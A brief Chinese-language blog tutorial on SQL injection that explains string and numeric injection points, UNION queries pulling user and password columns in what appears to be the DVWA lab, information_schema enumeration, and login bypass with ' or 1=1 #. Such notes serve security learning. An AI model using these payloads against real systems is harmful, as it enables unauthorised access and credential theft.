---
title: SqlInjection
date: 2020-01-05 17:27:58
categories:
- SQL
tags:
- SQL
---

## Sql注入的基本类型  

> - 数字型与字符类型  
> - 基于错误，基于响应时间的盲注，基于响应的注入

### 字符型
常基于以下SQL:  
`SELECT * FROM student_info WHERE id = '$id' and name = '$name';`

### 数字型
常基于以下SQL:  
`SELECT * FROM student_info WHERE id = $id;`

## 用途

### 猜解数据库
1.报错信息



2.联合查询 union

`1' union select user,password from users#` 构造成 

`SELECT first_name, last_name FROM users WHERE user_id = '1' union select user,password from users#`;`

`select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#`;`    
从 information_schema 数据库里查询 

可查询的数据库信息有：  
- version()  查询当前数据库版本  
- @@version_compile_os 获取当前操作系统
- database() 当前数据库
- user() 用户


### 绕过验证

- 常用方式

1.注释符与永真判别式 

注释符用于注释掉后续内容；  

如：（字符型）   
`SELECT * FROM student_info WHERE id = '$id' and name = '$name';`

构造  ` 1' or 1=1 #` 成为 `SELECT * FROM student_info WHERE id = '1' or 1=1 # and name = '$name';`

如：（数字型）  
`SELECT * FROM student_info WHERE id = $id;`

构造 `1 or 1=1 #` 成为 `SELECT * FROM student_info WHERE id = 1 or 1=1 #;`


## 识别Sql注入  
### 判断注入点  
最简单的方式是  
**1'**  单引号判别，出错则说明有注入点

1.永真和永假表达式 or 1=1-- 
2.报错信息  
3.特定数据库的连接符  SQL SERVER ---


## 常用其它
sql注入常用技术有段还包括：

- 采用非主流通道技术
- 避开输入过滤技术
- 使用特殊的字符
- 强制产生错误
- 使用条件语句
- 利用存储过程
- 推断技术
........

- 宽字节注入
- urldecode二次注入
- sql注入防御
